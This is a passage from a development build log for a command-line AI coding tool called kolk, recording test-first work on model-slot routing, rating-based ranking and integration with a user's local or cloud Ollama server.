subscription it had already paid for sat there. That is the plainest waste this project can produce,
and it is now the first thing checked when a session names no model.

**Enabled *and* verified, never merely listed.** v1.2.3 made that distinction honest in `kolk plans`:
`listed` means a row in the matrix with nothing configured here. Routing must not quietly undo it, so
a connector that has never answered a turn is a promise rather than a capability. All three failing
shapes are tested — unverified, disabled, and neither.

**The plan said "for any slot it can fill" and that is not buildable as a ranking.** A subscription is
not a model id in the gateway catalogue; it is a **backend**, chosen for the session. `streamChat`
takes a model string against the one `a.Backend` that every subagent shares, so per-slot subscription
routing would need per-task backends — a different and much larger change than the sentence implied.
The doc is corrected and the smaller true thing shipped: a session-level preference, which is what
the ask was actually about. That is the fifth documented claim to fail against the code this week and
the second that was mine.

**The first wiring broke two existing tests, and they were right to break.** Startup injects its own
model chooser as a seam; my version called the real one again from inside the new path, ignoring the
injection. The function now takes the choice already made and either replaces it with a subscription
or hands it back — which is both correct and simpler than what it replaced.

Acceptance checklist:

- [x] six tests written first, three of them the ways a connector must *not* qualify.
- [x] the enabled-and-verified distinction preserved rather than quietly widened.
- [x] the plan's slot-shaped claim checked against the code and corrected where it failed.
- [x] the seam-breaking wiring fixed by taking the existing choice, not by adjusting the tests.
- [x] stable order, so two runs on one machine choose the same plan.
- [x] full `make check` green: 2,400 tests, 0 lint issues.

### A33.5 built — the one signal no benchmark has

A vendor benchmark says whether a model is good. This machine's own ratings say whether it was good
**at this person's work**, which is the only question a router here can actually answer. `/rate`
already collects them and `kolk stats` already folds them per model; nothing had ever used them for
anything but a table.

**Three values, not a weight.** A model is disliked, has no opinion attached, or is liked — and that
verdict outranks every per-slot heuristic, because what this machine has seen beats what a
description claims. A continuous weight would invite tuning, and there is nothing to tune against:
this is one person's handful of ratings, not a dataset.

**Three rules keep it from becoming noise with a numeric face.** Fewer than three ratings changes
nothing, so somebody who mis-clicks once does not lose a model and a single turn — which says more
about the task than the model — is not a verdict. A middling average changes nothing, because only a
clear opinion is a signal. And **demotion is not exclusion**: a badly rated model sorts last rather
than off the list, so it is still chosen when it is the only tool-capable model there is. Each of
those has its own test, including the one that would otherwise leave a run with no model at all.

**Reuse rather than a second opinion.** `RatingsByModel` is a projection of `Aggregate`, which
already applies the rule that a turn's rating belongs to every call in that turn. Re-deriving that
join would have put the same rule in two places, and this project has spent the week removing
duplicates of exactly that shape.

**Measured, and the number decided where the call goes.** `Aggregate` decodes the whole usage log:
**226 ms on a 5.9 MB file**. That is fine once per session and indefensible per plan, so it is read
when the agent is built and handed over as plain values — the engine may not import `internal/stats`,
being a layer below the adapters, which is the same reason `DirtyFiles` and the hook runner are
host-supplied.

**The dead-export rule fired again, and correctly.** Making the ratings-aware ranking the real path
left `RankForSlot` exported with only test callers — the same shape as `CostBySession` in I27.4. The
answer was not an allowlist entry but one function: `rankForSlot` now takes a verdict that may be
nil, nil meaning no opinion, which is the normal state of a machine that has rated nothing.

Acceptance checklist:

- [x] nine tests written first across two packages, including the only-model-left case.
- [x] the evidence threshold justified rather than picked: one rating must not rearrange a run.
- [x] demotion proven not to be exclusion.
- [x] the existing rating-to-call join reused instead of re-derived.
- [x] the read measured, and placed once per session on that evidence.
- [x] the exported wrapper collapsed rather than allowlisted when the ratchet caught it.
- [x] full `make check` green: 2,397 tests, 0 lint issues.

### A33.4 built — the slots stop collapsing to one model

Four slots and six task kinds have existed and been configurable for a while, and **nothing filled
them**: an unset slot fell through to the effort model, so a default install ran every subagent on
the same model as the main one. The roles existed on paper. This is the choosing.

**Cross-provider needed no plumbing**, which the plan predicted and the code confirmed: the gateway
routes any model id, so a run whose orchestrator is one vendor's model and whose workers are
another's was always one decision away. The decision is what was missing.

**Each slot ranks for what it is actually for.** Orchestrator: strongest coding-oriented model, price
ignored, because planning is where a weak model costs the most and the whole run is shaped by it.
Worker: coding-oriented, with free breaking a tie, since an equally suited free model is strictly
better. Explore: free first, then cheapest, then widest window — its job is volume. Fast: free, always,
which is A33.3's decision applied to the slot that does mechanical work. Every slot requires tool
support and a 32k floor, because a subagent that cannot call a tool cannot do any of this.

**The explore test was wrong and the code was right.** I asserted the cheap paid reader would win and
it chose the free model — which *is* cheaper, and clears the context floor. Rather than bend the code
to a bad expectation I made the rule explicit (free first for volume work) and split the test in two,
so the million-token model is still proven to win when nothing free is available. That is where a
wide window earns its place.

**Layering moved the code before I wrote much of it.** `RankForSlot` began in `internal/provider`,
which cannot see the engine's slot constants — L3 below L4. It belongs in the engine, where the
vocabulary is, using the provider's facts. `supportsTools` is now exported for it, so there is one
opinion about what a usable model is rather than two.

**Measured, because it runs per plan:** 400 models rank in 1.3 ms once, then 64 ns per call — the
choice is remembered per slot per session, so an eight-task plan ranks the catalogue once per slot
and a run's worker model cannot change halfway through, which would be a run nobody could reason
about.

Verified rather than assumed: the plan already prints each task's kind and model, so a per-slot choice
is visible before anything runs.

Acceptance checklist:

- [x] ten tests written first, including stability, an unknown slot and an empty catalogue.
- [x] a wrong test expectation corrected against the code rather than the code bent to it.
- [x] the layering violation found and the code moved, not worked around.
- [x] the ranking helpers reused rather than a second opinion about models grown.
- [x] the selection measured, and memoised so it is per plan and not per task.
- [x] full `make check` green: 2,388 tests, 0 lint issues.

### A33.3 built — free for small work, and a correction to my own plan

A paid session model used to send the fast lane to a paid default **even when a free tool-capable
model had been discovered**, so somebody who chose a strong model for real work paid it to name
sessions, draft commit messages and do boilerplate subtasks. A free model now wins whenever one
exists, the session's own model is kept when it is already free (switching costs the prompt cache for
nothing), and `slot.fast` still overrides everything.

**The plan called this a bug and the plan was wrong.** The function's comment says plainly: *"if the
session model is paid, FastLane uses a high-throughput, low-cost model."* It was deliberate. The doc
is corrected in place: this is a decision being changed, not a defect being found. Four claims in
this project's documents have now failed against the code this week, and this is the first one that
was mine and written the same day.

**Reading it properly also found what the old design was probably protecting.** Free tiers
rate-limit, and `FastLaneChat` calls the backend **directly** — not through the turn's free-model
rotation in `retry.go`. Always preferring free would have traded money for a session title that
sometimes fails. So the leaf carries a fallback: one retry on the low-cost default, and only one,
because a fast lane that keeps trying is a fast lane that stalls the thing it was helping. Both paths
are tested, including that a second failure reaches the caller rather than looping.

**The existing test did not pin what it appeared to.** `TestFastLaneModelSelection` asserts a paid
session gets `gemini-2.5-flash` — but its fixture has **no free models discovered**, so it was
pinning the no-free-model fallback, which is unchanged. The clause actually removed was never
covered, which is why it survived to be found by reading rather than by a failure.

Acceptance checklist:

- [x] six tests written first, including the exact case that was wrong.
- [x] the old test read carefully enough to know it did not cover the change.
- [x] the rate-limit risk the old design guarded against handled rather than ignored.
- [x] the fallback bounded to one attempt, with the second failure surfacing.
- [x] my own plan corrected where it called a decision a bug.
- [x] full `make check` green: 2,377 tests, 0 lint issues.

### A33.2 built — the count, where the person is already looking

The engine keeps a running total, an optional observer is told whenever it moves, and the TUI puts it
on the status row that already carries mode, effort, folder and state — **what the run is doing**,
rather than beside the cost, which is what the run has spent.

**Zero shows nothing.** A permanent `agents 0` on every session that never opens a subagent is the
sort of always-there number people stop reading, and this is one worth reading.

**It stays a count.** Item 29 refused resource telemetry on the test that nobody could name a
decision it would change; a running-agent count passes that test because it answers the two questions
a long orchestrated run actually raises — *is this still working, and how wide did it go.* A test
forbids a percentage, an elapsed time or a per-agent breakdown appearing in that row, so the next
person to reach for a progress bar has to argue with it first.

**Three things the shape of the code decided.** The counter is written from a goroutine per task, so
it is behind a mutex and the observer is called **outside** the lock — a slow renderer must not be
able to stall the run it is describing. The increment sits before the bus check, because the count is
a second consumer and a session with no bus still has somebody watching the composer. And
`SetAgents` mutates one field and redraws, exactly as `SetApproval` does, so a live count cannot
disturb a transcript or a draft somebody is typing while their run works.

The wiring has its own test. A count nothing feeds reads zero forever and looks correct, which is the
one way this fails silently — so the line that attaches the engine's observer to the controller is
pinned.

Acceptance checklist:

- [x] nine tests written first across engine and TUI, including a real orchestrated run.
- [x] the count proven to return to zero when a task fails, not only when one succeeds.
- [x] concurrency exercised with thirty-two tasks racing the same counter.
- [x] the row that renders it forbidden from growing a progress indicator.
- [x] the wire from engine to screen asserted, since an unfed count looks correct.
- [x] full `make check` green: 2,371 tests, 0 lint issues.

### A33.1 built — the events exist, and now something says them

`subagent.started` and `subagent.finished` have been in the protocol since A7 — declared, documented,
schema'd, conformance-tested — and **published by nothing**. An orchestrated run could not say how
wide it had gone because the information never left the engine. This is the publisher.

**Two decisions inside a small leaf.** The id each task carries is minted once per index and
remembered for the turn, because the start and the finish must pair: a reader that cannot pair them
is a reader whose count never comes back down, which is the specific way this feature fails while
still looking like it works. And the memo is cleared when the turn changes, so a task index — which
means nothing across turns — cannot pair this turn's finish with the last turn's start.

The events are published **around** `runSubagent` rather than inside it, because the event is about
the task's lifetime and the task is what `runOneTask` owns. The finish fires on every path out,
including failure.

**The mutation test caught my own vacuous test, which is the part worth recording.** The first
end-to-end test drove a two-task run and asserted starts equal finishes. Breaking the code so the
finish only publishes on success **did not fail it** — every task in that fixture succeeds, so the
failure path was never exercised and the assertion was decoration. A second run now plans two tasks
and gives the provider only one answer, so the second subagent genuinely errors; that test fails on
the mutation and asserts a subagent actually reported failure, so the fixture cannot quietly stop
exercising the path it exists for.

Acceptance checklist:

- [x] five tests written first, including one that drives a real orchestrated run rather than the publisher alone.
- [x] id stability and per-turn isolation tested, since the pairing is what a count depends on.
- [x] the finish proven to fire on failure — after the first test was found to be vacuous.
- [x] silent with no bus, so a run without one behaves exactly as before.
- [x] full `make check` green: 2,362 tests, 0 lint issues.

### E10 built — what E made dead is gone, and what it made false is no longer said

**Deleted:** `InstallRuntime`, `pinnedRuntime`, `PinnedRuntime`, `RuntimeRelease`, the managed
`Runtime` and its `RuntimeSpec`, `paths.LocalRuntimeDir`, and the three dead-export allowances that
had kept them — 800 lines of a runtime kolk will never install, with their tests. `Process` and
`StartFunc` survive, moved beside the starter that actually uses them.

**`localia pull` goes through the host now.** After the fit plan and the approval plan 25 always
required, the pull is the Ollama's own: `/api/pull`, streamed, one line per status and one per ten
percent of a layer, so a four-gigabyte download is watched rather than waited for. An error line in
the stream is a failed pull — Ollama reports failures after `200 OK` — and the mutation that reads
it as progress fails. An installed-but-idle Ollama is started for the pull and stopped after it,
the one command that earns a server; the mutation that leaves it running fails. No Ollama at all
names the install line.

**The stale sentences are gone, and a ratchet keeps them gone.** Seven phrases — "never touches a
host-owned Ollama", "managed local runtime", "Kolk-owned runtime", "pins no verified local
runtime" and the rest — were still in README, PLAN.md, the site and code comments, each a promise
about behaviour that no longer exists. `TestNoManagedSidecarClaimsSurvive` scans everything a user
reads as current; history is exempt by name. It was proven to bite by putting one phrase back.

**The site lost a provider row.** "Managed local · Pinned build pending" described a thing that
will not be built; the Ollama row now says what is true — *your own Ollama, found and used*.

**Left as it was, and said so:** `localia pull` still takes only names from kolk's five-entry sized
catalogue, because the fit plan needs a size and plan 25 refuses to promise a fit from a name.
Widening it to any name the registry serves is a decision about that promise, not a deletion.

**This closes L13.6.** Ten leaves, one worktree, every one rebased onto the other session's work
before it landed, and four of them corrected the plan on contact with the code: E3 split on a
dependency, E5's `tool_choice` claim was false, E8's `OLLAMA_CONTEXT_LENGTH` line was refused for
the VRAM reason, and E9's hardware seam already existed.

### E9 built — the picker shows the Ollama the user has, and refuses what a mode cannot use

`/model` now lists what the host actually serves, under the `ollama/` ids the router understands.
Local models are the local cost class, labelled with their size, whether the machine will run them
on a GPU or `CPU only`, and whether they can take tools. Cloud models bill against the Ollama plan,
so their row is the plan's: subscription when the connector is verified, sign-in-first — with the
command — when not.

**The rows this replaces were a trap.** The picker listed a static five-entry catalogue of models
nobody had pulled, under bare ids like `qwen2.5-coder:7b` that went to the gateway and 404'd. A row
that cannot be picked is not a row. The mutation that brings them back fails.

**The guard that matters is at selection.** The engine sends tool schemas by mode and never by
model, so a model without tools chosen in code or agent mode failed with a 400 in the middle of the
first turn. `switchModel` now refuses it there, with plan 06's sentence — *unavailable in code
mode: no tool support* — and says `/mode chat` can use it. Chat mode takes it; a tool-capable host
model is not refused. The mutation that drops the check fails. A listing that fails does not block
a selection: the worst case is the 400 this pre-empts, which is where things stood before.

**Never the default**, pinned: a session with a running host and pulled models still starts on the
gateway's free choice. The free-first chooser cannot tell a 1.5B local model from a 480B free one.

**Consolidated, after a slip.** I added a `probeHardware` seam and the build said "redeclared" —
`kolk localia` already had one, with the bounded probe around it. Mine is gone and the picker uses
theirs. The probe costs 112 µs on the owner's machine (sysfs, no nvidia-smi); where nvidia-smi
exists it is a process exec, bounded by the same timeout localia uses.

**An installed-but-idle Ollama lists nothing in the picker, on purpose.** Populating a picker by
starting a server is memory spent on a model nobody picked; `kolk models` and the doctor say why
the section is empty and what starts it.

### E8 built — the window the server actually runs, and a model that is warm when chosen

Ollama truncates an over-long prompt **from the front** and says nothing, which drops kolk's
system prompt and tool schemas first. A host model's window is not in the gateway catalogue, so
until now it was zero — "unknown means never compact" — and a long session would have been
silently truncated into a model that no longer knew what it was asked.

**The engine now asks the route.** When the session has no window of its own, `window()` asks the
routed backend for the active model's; a known window is never overridden, and a route that cannot
say leaves it unknown. The mutation that stops asking fails. Both readers — the meter and the
overflow recovery — go through it, so there is one answer.

**The host backend answers three ways, in order.** Before the server has said anything: the
floor, 4096, Ollama's smallest VRAM-chosen default, because unknown must be treated as small. After
the first turn or a warm: `/api/ps`, the window the server *loaded the model with* — measured at
0.3 ms and asked once per model. For a cloud model, which is never loaded here: the trained window
from `/api/show`, because nothing local constrains it. The mutations that return zero for unknown,
and that never learn, both fail.

**Warm on selection.** Choosing a host model sends a keep-alive load off the turn path, bounded at
two minutes and tied to the session's context — a warm that outlived the session would load a
model for nobody — so the first turn is not a cold load and the window is known before the first
prompt is built. The wire name, never the prefixed one; the mutation that warms `ollama/x` fails. A
gateway model warms nothing. The load itself was not measured here: the owner's server has no
model pulled, and a number invented for a leaf is worse than none.

**Consolidated:** the adopted server and the one kolk starts now share one backend core — client,
windows, warming — with the lazy starter as the only difference.

**One line of the queue was not followed, on purpose.** It said to set `OLLAMA_CONTEXT_LENGTH` on
a kolk-started server. Ollama's default is chosen by VRAM (4k, 32k or 256k), and a blind override
to 32k on a small card is an out-of-memory in the one code path meant to make things work. With the
window read from the server instead, kolk compacts to what the model actually runs with, and the
override buys nothing. Recorded here rather than silently skipped.

The invented-context ratchet caught the first version of the warm, which conjured a
`context.Background()`; `switchModel` now takes the caller's context, as the rule says it must.

### E7 built — the host is its own cost class, and its limit is about time, not money

A refusal from the user's own Ollama — a local model, or a cloud model proxied through it — is now
checked *first* in the retry path and returned once, unretried, with a sentence that says what it
is. Neither money policy touches it.

**Why first.** Ollama Cloud's limit resets — session limits every 5 hours, weekly ones every 7 days.
Its wording, "you have reached your session usage limit", matches the allowance phrases A33.7 uses
to recognise an exhausted plan, and two lines further down the retry path that match would have
prompted for, or under `switch` silently taken, a metered fallback. For a limit that clears by
itself. The mutation that removes the gate does exactly that — the run bills a gateway model — and
fails both tests.

**Why unretried.** The free-exhausted policy rotates gateway models through a 1-2-4 second
backoff. A local server does not rate-limit, and a limit that resets in hours is not cleared by
four seconds; waiting would be theatre. One attempt, no waits, no rotation, pinned.

**Consolidated, not invented.** The TUI already names three cost classes and `CostLocal` is one
of them; this leaf applies that class where the money decisions are actually made, rather than
adding a second vocabulary. The advice for a host 429 says the limit resets and that a local model
has none, and never mentions the gateway or credit.

### E6 built — the cloud connector is verified by asking, never by a turn

The other session had already landed the plan row ("Ollama Pro") and the login args (`signin`);
this leaf builds on both rather than beside them. What it adds is the verifier.

**`POST /api/me` is the truth, and kolk never holds the credential.** The server answers 200 with
the plan when signed in, 401 with a `signin_url` when not; the key is the server's own, in its home
directory. `local.SignIn` reads that. Unreachable is a third state, not "signed out": a verifier
that read a dead server as a revoked sign-in would un-verify a connector every time the machine
slept. The mutation that collapses the two fails — once aimed at the right line; the first aim hit
a branch unreachable for that case, which is worth writing down because a mutation that cannot
kill is a claim about a test, not a test.

**The login waits for the browser half.** `ollama signin` returns as soon as the browser opens, so
`kolk plans login ollama "Ollama Pro"` polls the server — bounded, with the URL printed in case the
browser never came — and records `Verified` only when the server says so. Recording it on a clean
exit, as the other connectors do, would be a claim; the mutation that does so fails. And with no
server listening the login does not start at all: `ollama signin` signs in a *server's* key, and a
connector recorded against nothing is a claim about nothing.

**Startup re-reads the truth, in both directions.** A sign-in recorded last month can have lapsed,
and A33.6 picks a session default from `Verified`. When a server is running, one POST brings the
connector in line with it and saves only on a change. Down as well as up — the mutation that only
ever raises it fails. Discovery is now done once per startup and shared with the route, so this
costs a probe (230 µs) and a POST, not two probes.

**The guard that matters is pinned:** a turn answered by a local model through the route does not
touch the connector. The `verifyingBackend` never wraps a route, and a test now says so with a
manifest that stays unverified across a successful local turn.

Not built, and said so: `planBackendFor` has no `ollama` case because no static plan model exists
for it, so the case would be unreachable; subscription-first for Ollama Cloud (A33.6) therefore
does not apply yet and waits on a dynamic cloud row, which is E9's catalogue work. And a sign-in
against a server kolk started itself would need `OLLAMA_HOST` carried into the login child; the
handover seam does not carry env, and the honest message beats a silent default.

### E3b built — kolk starts an Ollama of its own, lazily, and stops only that one

`local.HostStarter` starts the user's binary on a loopback port kolk chooses, with a curated
environment, waits for it to answer as Ollama, prints one transcript line naming the pid and
address, and stops it at exit. `local.LazyHostBackend` is the route registered when the binary is
installed and idle: nothing starts until the first turn asks for a host model. `Agent.Close` now
closes every route, so the server kolk started dies with the session even when the session backend
has nothing to close.

**Measured before deciding when.** Start-to-ready on the owner's machine: 300, 304 and 438 ms
across three runs. Paid once when asked for, that is nothing; paid at every startup for a model
nobody picked, it is the whole startup budget. Lazy it is.

**The guard that matters is the environment.** The only credential kolk holds is the OpenRouter
key, and a child process on this machine has no business seeing it. The server gets an allowlist —
its store, its GPU libraries, the locale — and never a credential; an allowlist rather than a
denylist, because a secret with a name nobody anticipated is the one a denylist lets through. The
user's own `OLLAMA_HOST` is dropped and replaced: the server has to bind kolk's port, not whatever
machine that variable names. The mutation that passes the environment through fails.

**Never the default port.** A kolk server on 11434 would be adopted by the next session as a host
server it must never stop — and outlive every kolk on a SIGKILL. The port chooser refuses it, and
the mutation that accepts it fails. So does the one that leaves an unready process running, and the
one that lets `Close` skip the routes.

**The process group and the death signal.** `StartManagedProcess` now puts the child in its own
group and `Close` takes the group: an inference server forks runners, and a Kill on the parent
alone leaves them holding the GPU. On Linux `Pdeathsig` sends `SIGTERM` when kolk's thread dies,
which is the only thing that stops a kolk server outliving a kolk that was killed rather than
closed. Outside Linux there is no death signal, and the file says so: a survivor is found by the
next session and adopted read-only, which is the safe direction. **Windows has no job object yet**
and its stub says that too, rather than claiming one.

One test was wrong rather than the code: the lazy-backend fake answered the heartbeat but not
`/api/version`, and the real probe correctly refused to call it Ollama.

### E5 built — the host answers, and its refusals say whose they are

`provider.NewHostClient` talks to the user's Ollama through its OpenAI-compatible `/v1`. A running
server found at startup is registered as the `ollama` route (E2), so `-m ollama/<model>` and
`/model ollama/<model>` reach it end to end — the first user-visible capability of E. Adopted
read-only: this session never stops a server it did not start.

Three things differ from the gateway client, each for a reason and each pinned by a test:

- **No key, and no transport that could attach one.** The only credential kolk holds is the
  OpenRouter key, and a Bearer header carrying it to a process on this machine is a credential
  leaving the service it belongs to. The key check is waived by *origin*, not removed: the gateway
  still refuses unauthenticated calls, and the mutation that makes every client require a key
  fails the keyless test.
- **No first-byte timeout.** A cold 7B on a CPU takes minutes to its first token; the gateway's
  60 s is right for a data centre and wrong here. The turn's own context bounds the wait.
- **Errors carry their origin.** `HTTPError` gains `Origin`, stamped by the client, and its message
  reads `ollama: HTTP 401` rather than `openrouter: HTTP 401`. `Advise` dispatches on it: a
  signed-out cloud model says *run `ollama signin`* and prints the `signin_url` the server offered,
  a missing model says *`ollama pull`*, a 5xx says *the model may not fit in memory* — instead of
  *set a working key with `kolk key`*, which was what a local refusal used to produce.

**A corruption nobody had hit yet.** `readStream` merged tool-call deltas by index, and an absent
index decodes as 0. A server that sends complete calls without indexes would have had its second
call's arguments appended to its first — one call with garbage JSON. A new id at an occupied index
is now a new call. The mutation that removes the check produces exactly that corruption and fails.

**One claim in the queue was wrong.** It said `tool_choice` must be dropped for this backend. The
client never sends `tool_choice`; there was nothing to drop. Checked rather than built.

**And one panic caught by an existing test.** An app built without the discovery seam — as the
single-shot test does — dereferenced nil at startup. A missing seam now means no host route, never
a crash.

### E4 built — the host's models, decoded from what the server says and nothing else

`local.ListHostModels` reads `/api/tags`, then `/api/show` per model, into `HostModel`: tools,
vision and thinking from `capabilities`; context from `details.context_length`, else from
`model_info["<architecture>.context_length"]` where older servers and cloud models keep it; local
versus cloud from `remote_host`. `HostModel.ModelInfo()` projects into the shape the rest of kolk
ranks and prints, with the `ollama/` prefix E2's router strips at the wire. Surfaced twice: a
`local` section under `kolk models`, never mixed into the gateway rows, and a model count in the
doctor.

**The guard that matters is the unknown.** Before 0.6.4 `/api/show` has no `capabilities`, and a
model whose show failed has none either. Both are `CapabilitiesKnown: false`, and a model with no
claim claims no tools — a ranker that guessed here would send tool schemas to a model that 400s on
them. The mutation that trusts every server kills. So does the one that drops a model whose show
failed: the user pulled it and can see it in `ollama list`, and a listing that lost it would be one
they cannot trust.

**Measured before shipping, cold and warm.** Twenty models: 4.4 ms cold, 0.58 ms warm mean,
1.3 ms warm worst. The tags list is always fetched — it is one request, and a pulled or removed model
should be seen at once — while each model's show answer is cached by digest beside the gateway
catalogue and invalidated when the server version changes. The mutation that ignores the cache
kills.

`"models": null` is an empty list, not an error: it is a user with nothing pulled. Cloud models
project with no pricing rather than zero, so nothing reads them as free — they bill against the
Ollama plan, and E7 gives that a cost class of its own.

**A slip worth recording:** the first attempt at the surface silently did nothing, because an
edit anchor missed after gofmt realigned a struct field, and the dead-export ratchet caught the
uncalled decoder before the commit. That is the ratchet doing exactly its job.

### E3a built — kolk knows whose Ollama it is looking at

`local.DiscoverHost` probes the loopback default and PATH and reports running, installed or
absent. `kolk doctor` has a `local models` section that tells the three apart, and in the absent
case names the install line — and says it will not run it, because the Linux installer needs sudo
and pipes curl into sh, both of which kolk's own hardline refuses.

**Adoption requires identification.** The port may be held by a dev server, a proxy or an old
experiment, and plenty of services answer `/api/version` with a version object. Only the root's
"Ollama is running" — the vendor CLI's own heartbeat — tells them apart. The first stranger test
was too weak to prove this: its fake answered garbage everywhere, so the version check caught it
and the mutation that dropped the root check survived. Made the stranger plausible (a real version
object, no heartbeat) and the mutation kills.

**Never `OLLAMA_HOST`.** It may name another machine or ollama.com itself. A test sets it to a
live fake and proves discovery does not follow it.

**Measured before shipping:** 119 µs mean with nothing listening, 230 µs against a running server,
worst case under a millisecond. It runs at startup and costs nothing anyone will notice.

Three ratchets shaped the leaf, and each was right. The dead-export rule caught `HostAbsent`
reachable only from tests, because the doctor used `default:`. The GOOS rule refused a switch on
`runtime.GOOS`. Then the layer rule refused the build-tagged files I replaced it with, because
OS-divergent files belong in the platform layer alone — and the GOOS rule's own comment had the
answer: reading GOOS as a *value* is fine, only branching on it is banned. The install hint is a
table keyed by GOOS, which is a lookup and not a branch.

**The leaf split on a dependency.** Adopting a server means registering a backend for it, and the
backend is E5. Starting kolk's own server (E3b) is queued after E5 for the same reason, and it will
start lazily on first use rather than at startup: an idle server for a model nobody picked is memory
spent on nothing.

`make check` green.

### E2 built — the engine can hold a second backend without lying to the first

`ownedPrefixes` names the model-id prefixes the engine routes itself; `Routes` holds a backend per
prefix; `backendFor` resolves every call. Both engine call sites go through it — the turn's retry
path and the fast lane, which calls the backend directly and would otherwise have sent a host model
to the gateway wearing a prefix the gateway has never seen.

**The guard that matters is the refusal.** Every gateway id already has the shape `vendor/model`,
so a slash is not a route: only a listed prefix is. And a listed prefix with no backend behind it is
refused, never forwarded — at best a 404 about a model the user did not type, at worst a gateway
that happened to know the name answering it for money. Three mutations confirm the three edges:
forwarding an unrouted host id, forgetting to strip the prefix, and treating every vendor as owned.
All three fail the tests.

**Resolved per attempt, not per turn.** Free rotation and the metered fallback change `model` inside
the retry loop; a backend resolved once at the top would keep answering for the model that just
left. And routes live beside `Backend`, not in it, because `moveToMetered` and `switchModel` swap
`Backend` between the plan provider and the gateway client — a route that lived there would vanish
on the first swap, which a test now pins.

This is the wall A33.6 hit ("a subscription is a backend, not a model id"). It is gone for host
models; subscriptions still ride `Backend` and could move onto routes later if a plan ever wants
per-slot backends.

`make check` green at 2,529 tests.

### L13.6 queued — option E, host Ollama, one leaf per tick

Rewritten 2026-08-29. The A–D queue is deleted rather than ticked: the owner chose none of them.
The contract is in [`docs/plan/25-managed-local-models.md`](docs/plan/25-managed-local-models.md);
each leaf builds to it rather than re-deciding it. Order is dependency order, and the picker leaf
is deliberately late because item 34 is working in the same files.

- [x] **E1 the decision in writing** — plan 25's contract rewritten as E, A–D deleted, the review's
      findings recorded so nobody re-derives them.
- [x] **E2 the model→backend router** — the engine owns a prefix (`ollama/`), strips it at the wire,
      and resolves a backend per model; `a.Backend` stays the default. The gateway catalogue never
      holds a host id. A persisted host id with no server is a stop naming the server, never a route
      to the gateway. This is the wall A33.6 hit; it comes first because nothing else can.
- [x] **E3a detect and adopt** — probe the literal `127.0.0.1:11434`, never `OLLAMA_HOST`; adopt
      only a server that identifies itself, because a stranger on the port answers 200 too;
      bounded at 300 ms; the binary found on PATH; `kolk doctor` tells the three states apart and
      names the install line without running it. Measured: 119 µs with nothing listening, 230 µs
      against a running server. Split from E3 because adoption *registers a backend*, and the
      backend is E5 — a started server with nothing to use it would be an export with no caller.
- [x] **E4 the catalogue decoder** — `/api/tags` then `/api/show` per model into `ModelInfo`:
      tools from `capabilities`, context from `details.context_length`, local vs cloud from
      `remote_host`. Version floor from `/api/version`. `"data": null` is an empty list, not an
      error. Measure the per-startup cost with N models and cache it beside the gateway catalogue.
- [x] **E5 the HTTP backend** — `provider.Client` against `/v1` with no key, its own transport with
      no first-byte timeout, `tool_choice` dropped, tool-call slots keyed by id when the index is
      absent or repeats. `HTTPError` gains an origin so a signed-out cloud model does not read as
      "OpenRouter rejected the API key"; `Advise` dispatches on it; a `401` body's `signin_url` is
      printed.
- [x] **E3b start one of kolk's own** — when nothing listens and the binary is on PATH: a
      kolk-chosen loopback port, curated env (`HOME`, `PATH`, `OLLAMA_HOST`; never
      `OPENROUTER_API_KEY`), readiness bounded, death signal on Linux and a job object on Windows
      (neither exists in `internal/shell` yet), one transcript line, stopped only if kolk started
      it. Started lazily on first use, not at startup: an idle server for a model nobody picked is
      memory spent on nothing. After E5, so the route it registers exists.
- [x] **E6 the cloud connector** — a plan row for Ollama Cloud, login args `{"signin"}` with
      `OLLAMA_HOST` pointed at the server kolk uses, verified by `POST /api/me` and never by an
      answered turn. Cloud rows from the local `/api/show` proxy, not static entries that retire.
- [x] **E7 limits and cost class** — a third class, `local`, that neither `on_free_exhausted` nor
      `on_subscription_limit` governs; Ollama Cloud's `429` classified as a limit that resets, with
      the reset hint, never as an exhausted plan.
- [x] **E8 context and warmth** — `OLLAMA_CONTEXT_LENGTH` on a kolk-started server; the loaded
      model's real window from `/api/ps` on an adopted one; unknown treated as small, because Ollama
      truncates from the front. A keep-alive request on selection so the first turn is not a cold
      load.
- [x] **E9 the picker rows** — host models as rows labelled local (with `CPU only` from the fit
      planner when there is no accelerator) or cloud; chat-only when `tools` is absent, and
      code/agent mode refused at selection with plan 06's sentence rather than a 400 mid-turn.
      Never the default. Last, because item 34 owns these files today.
- [x] **E10 delete what E makes dead** — `InstallRuntime`, `pinnedRuntime` and their dead-export
      allowances; `localia pull` re-pointed at the host's `/api/pull` with the explicit approval
      plan 25 always required; `SidecarName`'s "never used" comment and every remaining sentence
      that says kolk never touches a host Ollama.
- [x] **E11 the cloud catalogue** — rows for Ollama Cloud models the user has *not* pulled, from
      `ollama.com/api/tags` (readable unauthenticated) through the local `/api/show` proxy for
      capabilities, so a signed-in user sees what the plan can run. Found by the v1.2.21 pre-release
      review: the contract said cloud models "appear once signed in", and only pulled ones did.

  - [x] **E11.0 contract and boundaries** — the public list is metadata only and never receives
    credentials; each candidate is normalized to Ollama's `:cloud`/`-cloud` selector and checked
    through the local `/api/show`; only a remote response becomes a Cloud row. Unpulled rows say
    `ollama pull <name>`, are not free/local, and never trigger a pull. Public/proxy failure is
    best-effort and preserves known host rows. Current upstream behavior requiring a Cloud stub
    pull is recorded in `docs/plan/25-managed-local-models.md`.
  - [x] **E11.1 bounded public catalogue** — strict response decoding, fixed endpoint, request/body/
    row limits, timeout and cancellation, with no credential or redirect leakage. Red/green tests
    cover valid/null/malformed responses, non-OK status, all bounds, cancellation, cookies, and
    redirects; normal and race package tests pass, and each guard survived a targeted mutation.
  - [x] **E11.2 local proxy enrichment** — bounded `/api/show` probing, capability/context decoding,
    remote-host proof, alias normalization, and cache behavior tested before picker wiring. Normal
    and race local tests pass; targeted mutations caught remote proof, cache proof, alias selection,
    and the `/api/show` body bound.
  - [x] **E11.3 merged presentation** — deduplicate pulled and unpulled Cloud rows, preserve local
    rows and connector login/subscription labels, and expose the same honest state in `/model` and
    `kolk models` without making unpulled models runnable by implication. Normal and race CLI tests
    pass; merge, both surfaces, both pull labels, and discovery fallback survived targeted mutations.
  - [x] **E11.4 hardening and gates** — failure matrix, cancellation/race tests, mutation checks,
    full `make check`, and the final build-log evidence. The exact current tree passes the final
    gate at 2,975 tests; no local Ollama server was running for a live `/api/show` smoke test.

### Owner-cleared queue — devices, failure paths, first run, a pinned runtime

Cleared by the owner on 2026-08-28 after a review of everything parked. One leaf per tick, in order.
The two sandbox-shaped items were settled in the same pass and are recorded under "Refused" below.

**I26.8 `kolk devices` — pairing is one-way today.** `devices.Store.Revoke` and `.List` are written
and tested, and neither has a caller outside a test: a device paired once stays paired until someone
